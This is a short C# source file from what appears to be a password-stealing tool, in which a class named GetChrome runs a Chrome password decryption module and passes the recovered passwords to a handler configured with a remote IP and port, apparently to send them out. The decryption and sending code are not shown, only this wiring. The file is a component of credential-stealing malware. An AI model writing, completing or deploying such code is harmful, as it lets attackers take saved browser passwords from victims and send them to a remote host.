using PS03.PasswordOps.ChromeDecrypt;

namespace PS03.PasswordOps
{
    public class GetChrome
    {
        private int _port;
        private string _ip;
        private bool trans;
        private bool verbose;

        public GetChrome(string ip, int port, bool t, bool v)
        {
            trans = t;
            verbose = v;
            this._ip = ip;
            this._port = port;
        }
        public void Execute()
        {
            var ev = new Eventhandlers(_ip, _port,trans,verbose);
            CDC.OnPasswordReady += ev.HandleChromeDataReady;
            CDC.Execute();
        }
    }

}